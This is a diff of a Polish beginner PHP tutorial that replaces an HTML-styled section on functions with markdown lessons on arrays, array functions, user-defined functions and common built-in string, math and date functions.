 ```php
 <?php
-function powitajUzytkownika($imie) {
-    echo "Cześć, $imie! Jak się masz?";
-}
-
-powitajUzytkownika("Anna"); // Wyświetli: Cześć, Anna! Jak się masz?
-powitajUzytkownika("Jan");  // Wyświetli: Cześć, Jan! Jak się masz?
+    // Tablica 2D - lista uczniów
+    $uczniowie = [
+        ["Jan", "Kowalski", 5],
+        ["Anna", "Nowak", 4],
+        ["Piotr", "Wiśniewski", 6],
+        ["Maria", "Kowalczyk", 5]
+    ];
+    
+    // Dostęp do elementów
+    echo $uczniowie[0][0];  // Jan (pierwszy uczeń, pierwsze pole)
+    echo $uczniowie[0][1];  // Kowalski
+    echo $uczniowie[0][2];  // 5
+    echo $uczniowie[1][0];  // Anna (drugi uczeń, pierwsze pole)
+    
+    // Przechodzenie przez tablicę 2D
+    foreach ($uczniowie as $uczen) {
+        echo $uczen[0] . " " . $uczen[1] . " - ocena: " . $uczen[2] . "<br>";
+    }
+    
+    // Wynik:
+    // Jan Kowalski - ocena: 5
+    // Anna Nowak - ocena: 4
+    // Piotr Wiśniewski - ocena: 6
+    // Maria Kowalczyk - ocena: 5
 ?>
 ```
 
-</div>
-
-### 🔢 Wiele parametrów:
-
-<div style="background: #2d3748; border-radius: 10px; padding: 20px; margin: 20px 0; position: relative;">
-<div style="position: absolute; top: 12px; right: 12px; background: rgba(255,255,255,0.1); padding: 4px 8px; border-radius: 4px; font-size: 12px; color: #cbd5e0;">PHP</div>
+#### **Tablica asocjacyjna 2D (lepiej czytelna):**
 
 ```php
 <?php
-function obliczCeneBrutto($cenaNetto, $vat) {
-    $cenaBrutto = $cenaNetto * (1 + $vat);
-    return $cenaBrutto;
-}
-
-$produkt1 = obliczCeneBrutto(100, 0.23); // 100 zł netto + 23% VAT
-echo "Cena brutto: $produkt1 zł"; // Wyświetli: Cena brutto: 123 zł
+    $uczniowie = [
+        [
+            "imie" => "Jan",
+            "nazwisko" => "Kowalski",
+            "ocena" => 5
+        ],
+        [
+            "imie" => "Anna",
+            "nazwisko" => "Nowak",
+            "ocena" => 4
+        ],
+        [
+            "imie" => "Piotr",
+            "nazwisko" => "Wiśniewski",
+            "ocena" => 6
+        ]
+    ];
+    
+    // Dostęp do elementów
+    echo $uczniowie[0]["imie"];     // Jan
+    echo $uczniowie[1]["nazwisko"]; // Nowak
+    echo $uczniowie[2]["ocena"];    // 6
+    
+    // Przechodzenie przez tablicę
+    foreach ($uczniowie as $uczen) {
+        echo "{$uczen['imie']} {$uczen['nazwisko']} - ocena: {$uczen['ocena']}<br>";
+    }
 ?>
 ```
 
-</div>
+### **Podstawowe operacje na tablicach**
 
----
-
-## **Wartości domyślne parametrów**
-
-<div style="background: linear-gradient(135deg, #a8edea 0%, #fed6e3 100%); padding: 16px; border-radius: 10px; margin: 20px 0; color: #2d3436;">
-<p style="margin: 0; font-weight: 500;">⚙️ <strong>Wartości domyślne</strong> to jak ustawienia fabryczne – jeśli nie podasz wartości, użyje się domyślnej.</p>
-</div>
-
-<div style="background: #2d3748; border-radius: 10px; padding: 20px; margin: 20px 0; position: relative;">
-<div style="position: absolute; top: 12px; right: 12px; background: rgba(255,255,255,0.1); padding: 4px 8px; border-radius: 4px; font-size: 12px; color: #cbd5e0;">PHP</div>
+#### **1. Dodawanie elementów**
 
 ```php
 <?php
-function ustawJezyk($jezyk = "polski") {
-    echo "Wybrany język: $jezyk";
-}
-
-ustawJezyk();           // Wyświetli: Wybrany język: polski
-ustawJezyk("angielski"); // Wyświetli: Wybrany język: angielski
+    $owoce = ["jabłko", "banan"];
+    
+    // Sposób 1: [] - dodaje na końcu
+    $owoce[] = "pomarańcza";
+    
+    // Sposób 2: array_push() - dodaje jeden lub więcej elementów na końcu
+    array_push($owoce, "gruszka", "śliwka");
+    
+    // Sposób 3: array_unshift() - dodaje na początku
+    array_unshift($owoce, "arbuz");
+    
+    print_r($owoce);
+    // Array ( [0] => arbuz [1] => jabłko [2] => banan [3] => pomarańcza [4] => gruszka [5] => śliwka )
 ?>
 ```
 
-</div>
-
----
-
-## **Zwracanie wartości z funkcji**
-
-Funkcje mogą zwracać wyniki za pomocą `return`. To pozwala użyć wyniku w dalszej części programu. Bez `return` funkcja wykonuje zadanie, ale nie „oddaje" wyniku.
-
-<div style="background: #2d3748; border-radius: 10px; padding: 20px; margin: 20px 0; position: relative;">
-<div style="position: absolute; top: 12px; right: 12px; background: rgba(255,255,255,0.1); padding: 4px 8px; border-radius: 4px; font-size: 12px; color: #cbd5e0;">PHP</div>
+#### **2. Usuwanie elementów**
 
 ```php
 <?php
-function czyPelnoletni($wiek) {
-    if ($wiek >= 18) {
-        return true;
-    } else {
+    $owoce = ["jabłko", "banan", "gruszka", "pomarańcza"];
+    
+    // unset() - usuwa element o konkretnym indeksie
+    unset($owoce[1]);  // Usuwa "banan"
+    print_r($owoce);
+    // Array ( [0] => jabłko [2] => gruszka [3] => pomarańcza )
+    // UWAGA: indeks 1 został usunięty, nie ma "przep indexed"
+    
+    // array_values() - resetuje indeksy
+    $owoce = array_values($owoce);
+    print_r($owoce);
+    // Array ( [0] => jabłko [1] => gruszka [2] => pomarańcza )
+    
+    // array_pop() - usuwa i zwraca ostatni element
+    $ostatni = array_pop($owoce);
+    echo $ostatni;  // pomarańcza
+    
+    // array_shift() - usuwa i zwraca pierwszy element
+    $pierwszy = array_shift($owoce);
+    echo $pierwszy;  // jabłko
+?>
+```
+
+#### **3. Sprawdzanie istnienia**
+
+```php
+<?php
+    $owoce = ["jabłko", "banan", "gruszka"];
+    
+    // in_array() - czy wartość istnieje w tablicy?
+    if (in_array("banan", $owoce)) {
+        echo "Banan jest na liście";  // Wykona się
+    }
+    
+    // array_key_exists() - czy klucz istnieje?
+    $osoba = ["imie" => "Jan", "wiek" => 25];
+    if (array_key_exists("imie", $osoba)) {
+        echo "Klucz 'imie' istnieje";  // Wykona się
+    }
+    
+    // isset() - czy klucz istnieje i nie jest null?
+    if (isset($osoba["imie"])) {
+        echo "Klucz 'imie' istnieje i ma wartość";
+    }
+?>
+```
+
+#### **4. Wyszukiwanie**
+
+```php
+<?php
+    $owoce = ["jabłko", "banan", "gruszka", "pomarańcza"];
+    
+    // array_search() - znajduje klucz dla wartości
+    $indeks = array_search("gruszka", $owoce);
+    echo $indeks;  // 2
+    
+    if ($indeks !== false) {
+        echo "Gruszka jest pod indeksem $indeks";
+    }
+?>
+```
+
+#### **5. Liczenie elementów**
+
+```php
+<?php
+    $owoce = ["jabłko", "banan", "gruszka"];
+    
+    // count() lub sizeof() - liczba elementów
+    $ile = count($owoce);
+    echo $ile;  // 3
+?>
+```
+
+### **Sortowanie tablic**
+
+```php
+<?php
+    // 1. sort() - sortowanie rosnąco (resetuje klucze)
+    $liczby = [5, 2, 8, 1, 9];
+    sort($liczby);
+    print_r($liczby);  // Array ( [0] => 1 [1] => 2 [2] => 5 [3] => 8 [4] => 9 )
+    
+    // 2. rsort() - sortowanie malejąco (resetuje klucze)
+    $liczby = [5, 2, 8, 1, 9];
+    rsort($liczby);
+    print_r($liczby);  // Array ( [0] => 9 [1] => 8 [2] => 5 [3] => 2 [4] => 1 )
+    
+    // 3. asort() - sortowanie rosnąco (zachowuje klucze)
+    $produkty = ["laptop" => 3500, "mysz" => 120, "monitor" => 1000];
+    asort($produkty);
+    print_r($produkty);
+    // Array ( [mysz] => 120 [monitor] => 1000 [laptop] => 3500 )
+    
+    // 4. arsort() - sortowanie malejąco (zachowuje klucze)
+    arsort($produkty);
+    
+    // 5. ksort() - sortowanie według kluczy rosnąco
+    ksort($produkty);
+    // Array ( [laptop] => 3500 [monitor] => 1000 [mysz] => 120 )
+    
+    // 6. krsort() - sortowanie według kluczy malejąco
+    krsort($produkty);
+?>
+```
+
+### **Łączenie i dzielenie tablic**
+
+```php
+<?php
+    // array_merge() - łączenie tablic
+    $owoce = ["jabłko", "banan"];
+    $warzywa = ["marchew", "pomidor"];
+    $wszystko = array_merge($owoce, $warzywa);
+    print_r($wszystko);
+    // Array ( [0] => jabłko [1] => banan [2] => marchew [3] => pomidor )
+    
+    // array_slice() - wycinanie fragmentu tablicy
+    $liczby = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
+    $fragment = array_slice($liczby, 2, 4);  // Od indeksu 2, weź 4 elementy
+    print_r($fragment);  // Array ( [0] => 3 [1] => 4 [2] => 5 [3] => 6 )
+    
+    // array_splice() - usuwa i zwraca fragment (modyfikuje oryginalną tablicę)
+    $usunięte = array_splice($liczby, 2, 3);
+?>
+```
+
+### **Funkcje agregujące**
+
+```php
+<?php
+    $liczby = [10, 20, 30, 40, 50];
+    
+    // array_sum() - suma elementów
+    echo array_sum($liczby);  // 150
+    
+    // max() - największa wartość
+    echo max($liczby);  // 50
+    
+    // min() - najmniejsza wartość
+    echo min($liczby);  // 10
+    
+    // array_product() - iloczyn elementów
+    echo array_product([2, 3, 4]);  // 24
+?>
+```
+
+### **Przekształcanie tablic**
+
+```php
+<?php
+    // implode() (join) - łączy elementy w string
+    $owoce = ["jabłko", "banan", "gruszka"];
+    $tekst = implode(", ", $owoce);
+    echo $tekst;  // jabłko, banan, gruszka
+    
+    // explode() - dzieli string na tablicę
+    $tekst = "jabłko,banan,gruszka";
+    $tablica = explode(",", $tekst);
+    print_r($tablica);  // Array ( [0] => jabłko [1] => banan [2] => gruszka )
+    
+    // array_keys() - zwraca wszystkie klucze
+    $osoba = ["imie" => "Jan", "wiek" => 25];
+    $klucze = array_keys($osoba);
+    print_r($klucze);  // Array ( [0] => imie [1] => wiek )
+    
+    // array_values() - zwraca wszystkie wartości
+    $wartosci = array_values($osoba);
+    print_r($wartosci);  // Array ( [0] => Jan [1] => 25 )
+    
+    // array_flip() - zamienia klucze z wartościami
+    $zamienione = array_flip($osoba);
+    print_r($zamienione);  // Array ( [Jan] => imie [25] => wiek )
+?>
+```
+
+### **Zaawansowane funkcje tablicowe**
+
+```php
+<?php
+    // array_map() - aplikuje funkcję do każdego elementu
+    $liczby = [1, 2, 3, 4, 5];
+    $kwadraty = array_map(function($n) {
+        return $n * $n;
+    }, $liczby);
+    print_r($kwadraty);  // Array ( [0] => 1 [1] => 4 [2] => 9 [3] => 16 [4] => 25 )
+    
+    // array_filter() - filtruje elementy według warunku
+    $liczby = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
+    $parzyste = array_filter($liczby, function($n) {
+        return $n % 2 == 0;
+    });
+    print_r($parzyste);  // Array ( [1] => 2 [3] => 4 [5] => 6 [7] => 8 [9] => 10 )
+    
+    // array_reduce() - redukuje tablicę do jednej wartości
+    $suma = array_reduce($liczby, function($carry, $item) {
+        return $carry + $item;
+    }, 0);
+    echo $suma;  // 55
+?>
+```
+
+### **Przydatna tabela funkcji tablicowych**
+
+| Funkcja | Opis | Przykład |
+|---------|------|----------|
+| `count($tab)` | Liczba elementów | `count([1,2,3])` → 3 |
+| `in_array($val, $tab)` | Czy wartość istnieje? | `in_array("x", ["a","x"])` → true |
+| `array_push($tab, $val)` | Dodaj na końcu | `array_push($tab, "nowy")` |
+| `array_pop($tab)` | Usuń i zwróć ostatni | `array_pop([1,2,3])` → 3 |
+| `array_shift($tab)` | Usuń i zwróć pierwszy | `array_shift([1,2,3])` → 1 |
+| `array_unshift($tab, $val)` | Dodaj na początku | `array_unshift($tab, "nowy")` |
+| `array_merge($t1, $t2)` | Połącz tablice | `array_merge([1], [2])` → [1,2] |
+| `array_slice($tab, $start, $len)` | Wytnij fragment | `array_slice([1,2,3,4], 1, 2)` → [2,3] |
+| `implode($sep, $tab)` | Połącz w string | `implode(",", ["a","b"])` → "a,b" |
+| `explode($sep, $str)` | Podziel string | `explode(",", "a,b")` → ["a","b"] |
+| `sort($tab)` | Sortuj rosnąco | `sort([3,1,2])` → [1,2,3] |
+| `rsort($tab)` | Sortuj malejąco | `rsort([1,2,3])` → [3,2,1] |
+| `array_keys($tab)` | Zwróć klucze | `array_keys(["a"=>1])` → ["a"] |
+| `array_values($tab)` | Zwróć wartości | `array_values(["a"=>1])` → [1] |
+| `array_sum($tab)` | Suma elementów | `array_sum([1,2,3])` → 6 |
+| `max($tab)` | Największa wartość | `max([1,5,3])` → 5 |
+| `min($tab)` | Najmniejsza wartość | `min([1,5,3])` → 1 |
+
+---
+
+## **8. Funkcje - organizacja kodu**
+
+Funkcja to nazwany fragment kodu, który możemy wielokrotnie wywoływać. Zamiast powtarzać ten sam kod, piszemy go raz jako funkcję i używamy gdzie potrzeba.
+
+**Analogia:** Funkcja jest jak przepis kulinarny:
+- **Nazwa** = nazwa przepisu (np. "upieczCiasto")
+- **Składniki** = parametry funkcji
+- **Instrukcje** = kod wewnątrz funkcji
+- **Gotowe danie** = zwracana wartość
+
+### **Tworzenie funkcji**
+
+```php
+<?php
+    // Składnia:
+    function nazwaFunkcji() {
+        // kod do wykonania
+    }
+    
+    // Prosty przykład:
+    function powitanie() {
+        echo "Witaj w PHP!<br>";
+        echo "Miło Cię poznać!<br>";
+    }
+    
+    // Wywołanie funkcji (wykonanie)
+    powitanie();
+    powitanie();  // Możemy wywołać wielokrotnie
+    
+    // Wynik:
+    // Witaj w PHP!
+    // Miło Cię poznać!
+    // Witaj w PHP!
+    // Miło Cię poznać!
+?>
+```
+
+### **Funkcje z parametrami**
+
+Parametry to dane przekazywane do funkcji:
+
+```php
+<?php
+    // Jeden parametr
+    function powitajOsobe($imie) {
+        echo "Witaj, $imie!<br>";
+    }
+    
+    powitajOsobe("Anna");   // Witaj, Anna!
+    powitajOsobe("Piotr");  // Witaj, Piotr!
+    
+    // Wiele parametrów
+    function przedstawSie($imie, $nazwisko, $wiek) {
+        echo "Nazywam się $imie $nazwisko i mam $wiek lat.<br>";
+    }
+    
+    przedstawSie("Jan", "Kowalski", 25);
+    // Nazywam się Jan Kowalski i mam 25 lat.
+    
+    // Parametry różnych typów
+    function obliczCeneBrutto($cenaNetto, $stawkaVAT) {
+        $brutto = $cenaNetto * (1 + $stawkaVAT);
+        echo "Cena brutto: $brutto zł<br>";
+    }
+    
+    obliczCeneBrutto(100, 0.23);  // Cena brutto: 123 zł
+?>
+```
+
+### **Wartości domyślne parametrów**
+
+Możemy ustawić domyślne wartości dla parametrów:
+
+```php
+<?php
+    function powitanie($imie = "Gościu", $jezyk = "polski") {
+        if ($jezyk == "polski") {
+            echo "Witaj, $imie!<br>";
+        } else {
+            echo "Hello, $imie!<br>";
+        }
+    }
+    
+    powitanie();                    // Witaj, Gościu! (używa domyślnych)
+    powitanie("Anna");              // Witaj, Anna! (używa domyślnego języka)
+    powitanie("John", "angielski"); // Hello, John!
+    
+    // WAŻNE: Parametry z wartościami domyślnymi muszą być NA KOŃCU
+    function test($a, $b = 10, $c = 20) { }  // ✅ Dobrze
+    function test($a = 10, $b, $c) { }       // ❌ ŹLE!
+?>
+```
+
+### **Zwracanie wartości - return**
+
+Funkcja może zwrócić wynik za pomocą `return`:
+
+```php
+<?php
+    function dodaj($a, $b) {
+        return $a + $b;
+    }
+    
+    $wynik = dodaj(5, 3);
+    echo $wynik;  // 8
+    
+    // Można użyć bezpośrednio w wyrażeniach
+    echo "Suma: " . dodaj(10, 20);  // Suma: 30
+    
+    if (dodaj(5, 5) > 8) {
+        echo "Suma większa niż 8";
+    }
+    
+    // return kończy wykonywanie funkcji
+    function testReturn() {
+        echo "To się wykona<br>";
+        return;
+        echo "To się NIE wykona<br>";  // Kod po return nie wykona się
+    }
+?>
+```
+
+**Funkcja BEZ return:**
+```php
+<?php
+    function bezReturn() {
+        echo "Coś robię";
+        // Brak return - funkcja zwróci null
+    }
+    
+    $wynik = bezReturn();  // Wyświetli "Coś robię"
+    var_dump($wynik);      // NULL
+?>
+```
+
+### **Typowanie parametrów i zwracanych wartości (PHP 7+)**
+
+```php
+<?php
+    // Typowanie parametrów
+    function dodaj(int $a, int $b): int {
+        return $a + $b;
+    }
+    
+    echo dodaj(5, 3);    // 8
+    echo dodaj(5.7, 3.2); // 8 (automatyczna konwersja do int)
+    
+    // Różne typy
+    function formatujTekst(string $tekst, bool $wielkie): string {
+        if ($wielkie) {
+            return strtoupper($tekst);
+        }
+        return strtolower($tekst);
+    }
+    
+    echo formatujTekst("PHP", true);   // PHP
+    echo formatujTekst("PHP", false);  // php
+?>
+```
+
+### **Zmienna liczba parametrów**
+
+```php
+<?php
+    // ... - rozpakowanie argumentów
+    function suma(...$liczby) {
+        $wynik = 0;
+        foreach ($liczby as $liczba) {
+            $wynik += $liczba;
+        }
+        return $wynik;
+    }
+    
+    echo suma(1, 2, 3);        // 6
+    echo suma(10, 20, 30, 40); // 100
+    echo suma(5);              // 5
+    
+    // func_get_args() - starsza metoda
+    function staraSuma() {
+        $args = func_get_args();
+        return array_sum($args);
+    }
+?>
+```
+
+### **Zasięg zmiennych (scope)**
+
+```php
+<?php
+    $globalna = "Jestem globalną";
+    
+    function testZasieg() {
+        $lokalna = "Jestem lokalną";
+        
+        echo $lokalna;     // ✅ Działa
+        // echo $globalna; // ❌ NIE działa - zmienna globalna niedostępna
+        
+        // Aby użyć zmiennej globalnej:
+        global $globalna;
+        echo $globalna;    // ✅ Teraz działa
+    }
+    
+    testZasieg();
+    // echo $lokalna;  // ❌ NIE działa - zmienna lokalna niedostępna poza funkcją
+?>
+```
+
+### **Zmienne statyczne**
+
+Zmienne statyczne zachowują wartość między wywołaniami funkcji:
+
+```php
+<?php
+    function licznik() {
+        static $licznik = 0;  // Inicjalizacja tylko raz
+        $licznik++;
+        echo "Wywołanie nr $licznik<br>";
+    }
+    
+    licznik();  // Wywołanie nr 1
+    licznik();  // Wywołanie nr 2
+    licznik();  // Wywołanie nr 3
+?>
+```
+
+### **Funkcje anonimowe (lambda)**
+
+Funkcje bez nazwy, przechowywane w zmiennych:
+
+```php
+<?php
+    // Przypisanie do zmiennej
+    $powitanie = function($imie) {
+        echo "Witaj, $imie!<br>";
+    };
+    
+    $powitanie("Anna");  // Witaj, Anna!
+    
+    // Jako parametr innej funkcji
+    $liczby = [1, 2, 3, 4, 5];
+    $kwadraty = array_map(function($n) {
+        return $n * $n;
+    }, $liczby);
+    
+    print_r($kwadraty);  // Array ( [0] => 1 [1] => 4 [2] => 9 [3] => 16 [4] => 25 )
+?>
+```
+
+### **Funkcje strzałkowe (arrow functions) - PHP 7.4+**
+
+Krótsza składnia dla prostych funkcji:
+
+```php
+<?php
+    // Zwykła funkcja anonimowa
+    $dodaj = function($a, $b) {
+        return $a + $b;
+    };
+    
+    // Funkcja strzałkowa (krócej)
+    $dodaj = fn($a, $b) => $a + $b;
+    
+    echo $dodaj(5, 3);  // 8
+    
+    // Użycie w array_map
+    $liczby = [1, 2, 3, 4, 5];
+    $kwadraty = array_map(fn($n) => $n * $n, $liczby);
+?>
+```
+
+### **Przydatne funkcje wbudowane**
+
+#### **Funkcje tekstowe (string)**
+
+```php
+<?php
+    $tekst = "  Hello World  ";
+    
+    // Długość tekstu
+    strlen($tekst);                    // 15 (ze spacjami)
+    strlen(trim($tekst));              // 11 (bez spacji)
+    
+    // Zmiana wielkości liter
+    strtoupper($tekst);                // "  HELLO WORLD  "
+    strtolower($tekst);                // "  hello world  "
+    ucfirst("hello");                  // "Hello" (pierwsza litera wielka)
+    ucwords("hello world");            // "Hello World" (każde słowo z wielkiej)
+    
+    // Usuwanie białych znaków
+    trim($tekst);                      // "Hello World"
+    ltrim($tekst);                     // "Hello World  " (z lewej)
+    rtrim($tekst);                     // "  Hello World" (z prawej)
+    
+    // Zastępowanie
+    str_replace("World", "PHP", $tekst);   // "  Hello PHP  "
+    str_ireplace("WORLD", "PHP", $tekst);  // "  Hello PHP  " (ignoruje wielkość liter)
+    
+    // Wycinanie
+    substr("Hello World", 0, 5);       // "Hello"
+    substr("Hello World", 6);          // "World"
+    substr("Hello World", -5);         // "World" (od końca)
+    
+    // Pozycja
+    strpos("Hello World", "World");    // 6
+    strpos("Hello World", "PHP");      // false (nie znaleziono)
+    
+    // Powtarzanie
+    str_repeat("Ha", 3);               // "HaHaHa"
+    
+    // Odwracanie
+    strrev("Hello");                   // "olleH"
+    
+    // Porównywanie
+    strcmp("abc", "abc");              // 0 (równe)
+    strcmp("abc", "def");              // < 0 (abc < def)
+?>
+```
+
+#### **Funkcje matematyczne**
+
+```php
+<?php
+    // Wartość bezwzględna
+    abs(-15);                // 15
+    
+    // Zaokrąglanie
+    round(4.6);              // 5
+    round(4.3);              // 4
+    round(4.567, 2);         // 4.57 (do 2 miejsc po przecinku)
+    ceil(4.3);               // 5 (zawsze w górę)
+    floor(4.9);              // 4 (zawsze w dół)
+    
+    // Min/Max
+    max(5, 10, 3, 8);        // 10
+    min(5, 10, 3, 8);        // 3
+    max([5, 10, 3, 8]);      // 10 (tablica jako argument)
+    
+    // Potęgowanie i pierwiastek
+    pow(2, 3);               // 8 (2³)
+    sqrt(25);                // 5 (√25)
+    
+    // Losowe liczby
+    rand();                  // Losowa liczba
+    rand(1, 100);            // Losowa liczba od 1 do 100
+    mt_rand(1, 100);         // Lepszy generator losowy
+    
+    // Stałe matematyczne
+    echo M_PI;               // 3.14159265359
+    echo M_E;                // 2.7182818284590452354
+?>
+```
+
+#### **Funkcje dla tablic (omówione w rozdziale 7)**
+
+```php
+<?php
+    $tab = [3, 1, 4, 1, 5];
+    
+    count($tab);             // 5 (liczba elementów)
+    array_sum($tab);         // 14 (suma)
+    array_product($tab);     // 60 (iloczyn)
+    in_array(4, $tab);       // true
+    array_push($tab, 9);     // Dodaj element
+    array_pop($tab);         // Usuń ostatni
+    sort($tab);              // Sortuj
+    array_unique($tab);      // Usuń duplikaty
+?>
+```
+
+#### **Funkcje daty i czasu**
+
+```php
+<?php
+    // Aktualny timestamp
+    $now = time();                      // np. 1679234567
+    
+    // Formatowanie daty
+    echo date("Y-m-d");                 // 2024-03-15
+    echo date("Y-m-d H:i:s");           // 2024-03-15 14:30:45
+    echo date("d/m/Y");                 // 15/03/2024
+    echo date("l, j F Y");              // Monday, 15 March 2024
+    
+    // Formaty daty:
+    // Y - rok (4 cyfry)
+    // m - miesiąc (01-12)
+    // d - dzień (01-31)
+    // H - godzina 24h (00-23)
+    // i - minuta (00-59)
+    // s - sekunda (00-59)
+    // l - dzień tygodnia (Monday-Sunday)
+    // F - nazwa miesiąca (January-December)
+    
+    // Timestamp dla konkretnej daty
+    $timestamp = strtotime("2024-12-25");
+    $timestamp = strtotime("+1 week");
+    $timestamp = strtotime("-1 month");
+    $timestamp = strtotime("next Monday");
+?>
+```
+
+### **Praktyczne przykłady funkcji**
+
+#### **Przykład 1: Kalkulator**
+
+```php
+<?php
+    function kalkulator($a, $b, $operacja) {
+        switch ($operacja) {
+            case "+":
+                return $a + $b;
+            case "-":
+                return $a - $b;
+            case "*":
+                return $a * $b;
+            case "/":
+                if ($b == 0) {
+                    return "Błąd: dzielenie przez zero!";
+                }
+                return $a / $b;
+            default:
+                return "Nieznana operacja";
+        }
+    }
+    
+    echo kalkulator(10, 5, "+");  // 15
+    echo kalkulator(10, 5, "-");  // 5
+    echo kalkulator(10, 5, "*");  // 50
+    echo kalkulator(10, 5, "/");  // 2
+?>
+```
+
+#### **Przykład 2: Walidacja email**
+
+```php
+<?php
+    function czyEmailPoprawny($email) {
+        // Sprawdzenie za pomocą filter_var
+        if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
+            return true;
+        }
         return false;
     }
-}
-
-$wiekUzytkownika = 20;
-if (czyPelnoletni($wiekUzytkownika)) {
-    echo "Jesteś pełnoletni!";
-} else {
-    echo "Nie jesteś pełnoletni.";
-}
-// Wyświetli: Jesteś pełnoletni!
-?>
-```
-
-</div>
-
-<div style="background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%); border-left: 5px solid #ffc107; padding: 16px; border-radius: 10px; margin: 20px 0;">
-<h4 style="margin-top: 0; color: #856404; display: flex; align-items: center; gap: 8px;"><span style="font-size: 18px;">⚠️</span> WAŻNE!</h4>
-<p style="color: #856404; margin: 0;">Gdy funkcja napotka <code style="background: rgba(0,0,0,0.1); padding: 2px 6px; border-radius: 4px;">return</code>, natychmiast kończy swoje działanie i zwraca wartość.</p>
-</div>
-
----
-
-## **Funkcje wbudowane w PHP – gotowe narzędzia**
-
-<div style="background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%); padding: 20px; border-radius: 12px; margin: 25px 0; text-align: center;">
-<h3 style="margin: 0 0 10px 0; color: #2d3436; font-size: 20px;">🛠️ Gotowy warsztat narzędzi</h3>
-<p style="margin: 0; color: #2d3436; font-size: 16px;">PHP ma setki gotowych funkcji, które oszczędzają czas. To jak zestaw narzędzi w warsztacie – nie musisz budować młotka, wystarczy go użyć!</p>
-</div>
-
-### 📝 Funkcje dla tekstu (string)
-
-<div style="background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 8px 25px rgba(0,0,0,0.1); margin: 25px 0;">
-<div style="background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); color: white; padding: 16px 20px;">
-<h4 style="margin: 0; font-size: 16px; display: flex; align-items: center; gap: 8px;"><span>📝</span> Funkcje tekstowe</h4>
-</div>
-<table style="width: 100%; border-collapse: collapse;">
-  <thead>
-    <tr style="background: #f8f9fa;">
-      <th style="padding: 12px 16px; text-align: left; color: #495057; font-weight: 600; width: 120px;">Funkcja</th>
-      <th style="padding: 12px 16px; text-align: left; color: #495057; font-weight: 600;">Działanie</th>
-      <th style="padding: 12px 16px; text-align: left; color: #495057; font-weight: 600;">Przykład</th>
-      <th style="padding: 12px 16px; text-align: left; color: #495057; font-weight: 600; width: 100px;">Wynik</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr style="border-bottom: 1px solid #f0f0f0;">
-      <td style="padding: 12px 16px;"><code style="background: #e3f2fd; color: #1565c0; padding: 4px 6px; border-radius: 4px; font-weight: 600;">strlen()</code></td>
-      <td style="padding: 12px 16px; color: #555;">Liczy znaki w tekście</td>
-      <td style="padding: 12px 16px;"><code style="background: #f8f9fa; padding: 4px 6px; border-radius: 4px;">strlen("Cześć")</code></td>
-      <td style="padding: 12px 16px;"><code style="background: #e8f5e9; color: #2e7d32; padding: 4px 6px; border-radius: 4px;">5</code></td>
-    </tr>
-    <tr style="border-bottom: 1px solid #f0f0f0;">
-      <td style="padding: 12px 16px;"><code style="background: #e3f2fd; color: #1565c0; padding: 4px 6px; border-radius: 4px; font-weight: 600;">strtoupper()</code></td>
-      <td style="padding: 12px 16px; color: #555;">Zamienia na wielkie litery</td>
-      <td style="padding: 12px 16px;"><code style="background: #f8f9fa; padding: 4px 6px; border-radius: 4px;">strtoupper("php")</code></td>
-      <td style="padding: 12px 16px;"><code style="background: #e8f5e9; color: #2e7d32; padding: 4px 6px; border-radius: 4px;">"PHP"</code></td>
-    </tr>
-    <tr style="border-bottom: 1px solid #f0f0f0;">
-      <td style="padding: 12px 16px;"><code style="background: #e3f2fd; color: #1565c0; padding: 4px 6px; border-radius: 4px; font-weight: 600;">strtolower()</code></td>
-      <td style="padding: 12px 16px; color: #555;">Zamienia na małe litery</td>
-      <td style="padding: 12px 16px;"><code style="background: #f8f9fa; padding: 4px 6px; border-radius: 4px;">strtolower("PHP")</code></td>
-      <td style="padding: 12px 16px;"><code style="background: #e8f5e9; color: #2e7d32; padding: 4px 6px; border-radius: 4px;">"php"</code></td>
-    </tr>
-    <tr style="border-bottom: 1px solid #f0f0f0;">
-      <td style="padding: 12px 16px;"><code style="background: #e3f2fd; color: #1565c0; padding: 4px 6px; border-radius: 4px; font-weight: 600;">str_replace()</code></td>
-      <td style="padding: 12px 16px; color: #555;">Zamienia fragment tekstu</td>
-      <td style="padding: 12px 16px; font-size: 13px;"><code style="background: #f8f9fa; padding: 4px 6px; border-radius: 4px;">str_replace("PHP", "Python", "Kocham PHP")</code></td>
-      <td style="padding: 12px 16px;"><code style="background: #e8f5e9; color: #2e7d32; padding: 4px 6px; border-radius: 4px; font-size: 12px;">"Kocham Python"</code></td>
-    </tr>
-    <tr>
-      <td style="padding: 12px 16px;"><code style="background: #e3f2fd; color: #1565c0; padding: 4px 6px; border-radius: 4px; font-weight: 600;">trim()</code></td>
-      <td style="padding: 12px 16px; color: #555;">Usuwa białe znaki z początku i końca</td>
-      <td style="padding: 12px 16px;"><code style="background: #f8f9fa; padding: 4px 6px; border-radius: 4px;">trim("  Cześć  ")</code></td>
-      <td style="padding: 12px 16px;"><code style="background: #e8f5e9; color: #2e7d32; padding: 4px 6px; border-radius: 4px;">"Cześć"</code></td>
-    </tr>
-  </tbody>
-</table>
-</div>
-
-#### 💻 Przykład użycia:
-
-<div style="background: #2d3748; border-radius: 10px; padding: 20px; margin: 20px 0; position: relative;">
-<div style="position: absolute; top: 12px; right: 12px; background: rgba(255,255,255,0.1); padding: 4px 8px; border-radius: 4px; font-size: 12px; color: #cbd5e0;">PHP</div>
-
-```php
-<?php
-$tekst = "  Witaj w PHP!  ";
-echo trim($tekst); // Wyświetli: Witaj w PHP!
-echo strtoupper($tekst); // Wyświetli:   WITAJ W PHP!
-?>
-```
-
-</div>
-
-### 📋 Funkcje dla tablic (array)
-
-<div style="background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 8px 25px rgba(0,0,0,0.1); margin: 25px 0;">
-<div style="background: linear-gradient(135deg, #43e97b 0%, #38f9d7 100%); color: white; padding: 16px 20px;">
-<h4 style="margin: 0; font-size: 16px; display: flex; align-items: center; gap: 8px;"><span>📋</span> Funkcje tablicowe</h4>
-</div>
-<table style="width: 100%; border-collapse: collapse;">
-  <thead>
-    <tr style="background: #f8f9fa;">
-      <th style="padding: 12px 16px; text-align: left; color: #495057; font-weight: 600; width: 140px;">Funkcja</th>
-      <th style="padding: 12px 16px; text-align: left; color: #495057; font-weight: 600;">Działanie</th>
